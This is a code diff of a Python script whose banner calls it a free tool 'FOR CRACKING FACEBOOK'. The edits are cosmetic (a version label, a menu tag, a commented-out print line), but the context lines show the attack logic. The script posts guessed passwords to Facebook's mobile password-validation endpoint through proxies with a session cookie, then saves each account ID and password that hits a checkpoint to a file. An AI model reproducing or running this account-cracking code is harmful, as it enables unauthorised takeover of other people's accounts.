@@ -235,7 +235,7 @@ def banner():
                  Rawa 
     ===============================
 
-NEW TOOL BY Omed AND hewa
+V1.5🔥
 THIS TOOL IS FREE AND FOR CRACKING FACEBOOK
 {PU}""")
 os.system('clear')
@@ -245,7 +245,7 @@ def menu():
 	os.system('clear')
 	banner()
 	print(f'{Y}[MENU]{Y}')
-	print(f'{N}[{Y}1{N}] CRACK BA FILE	')
+	print(f'{N}[{Y}1{N}] CRACK BA FILE[WORK🔥]	')
 	print(f'{N}[{Y}2{N}] CRACK BA ID	')
 	print(f'{N}[{Y}3{N}] BO DANANE COOKIES	')
 	print(f'{N}[{Y}4{N}] BO SRENAWAY COOKIES	')
@@ -1164,7 +1164,7 @@ def crackmobile_ARA(idf,pwv,nmf):
 }
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
+				#print(f'\r{N}[-CP]{R}{idf}{R}|{R}{pw}{R}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
